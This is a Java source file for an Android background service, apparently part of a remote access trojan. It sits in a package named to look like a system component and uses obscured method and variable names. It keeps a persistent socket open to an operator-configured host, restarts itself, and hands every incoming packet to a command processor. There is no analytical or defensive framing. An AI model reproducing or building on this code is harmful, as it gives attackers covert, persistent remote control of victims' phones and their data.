package com.android.pictach;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class com extends Service {

    private static final String TAG = "com";

    public static Socket s_com_k = null;
    public static OutputStream o_com_ut = null;

    private Thread socketThread = null;
    private volatile boolean running = false;
    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public IBinder onBind(Intent i) {
        return null;
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        if (!running) {
            running = true;
            sp();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        ctd();
    }

    // sp = socket prepare / connect
    public void sp() {
        socketThread = new Thread(() -> {
            while (running) {
                try {
                    String host = Lo();
                    int port = p();
                    if (host == null || host.isEmpty() || port <= 0) {
                        Thread.sleep(10000);
                        continue;
                    }
                    s_com_k = new Socket(host, port);
                    s_com_k.setKeepAlive(true);
                    s_com_k.setSoTimeout(0);
                    o_com_ut = s_com_k.getOutputStream();

                    InputStream in = s_com_k.getInputStream();
                    byte[] buf = new byte[4096];
                    int read;
                    while (running && (read = in.read(buf)) != -1) {
                        if (read > 0) {
                            final byte[] packet = new byte[read];
                            System.arraycopy(buf, 0, packet, 0, read);
                            handler.post(() -> {
                                try {
                                    Api.processPacket(packet);
                                } catch (Exception ignored) {}
                            });
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Socket error: " + e.getMessage());
                    ctd();
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                }
            }
        });
        socketThread.setDaemon(true);
        socketThread.start();
    }

    // p_com_r = process / send command response
    public void p_com_r() {
        // Reconnect trigger — called externally to force reconnect
        ctd();
        if (running) sp();
    }

    // Lo = load host from SharedPreferences
    private String Lo() {
        try {
            SharedPreferences prefs = getSharedPreferences(Config.FTX0, Context.MODE_PRIVATE);
            return prefs.getString(Config.FTX1, "");
        } catch (Exception e) {
            return "";
        }
    }

    // p = load port from SharedPreferences
    private int p() {
        try {
            SharedPreferences prefs = getSharedPreferences(Config.FTX0, Context.MODE_PRIVATE);
            String portStr = prefs.getString(Config.FTX2, "0");
            return Integer.parseInt(portStr);
        } catch (Exception e) {
            return 0;
        }
    }

    // ctd = close/terminate connection
    private void ctd() {
        try {
            if (s_com_k != null) {
                s_com_k.close();
                s_com_k = null;
            }
            o_com_ut = null;
        } catch (IOException ignored) {}
    }
}
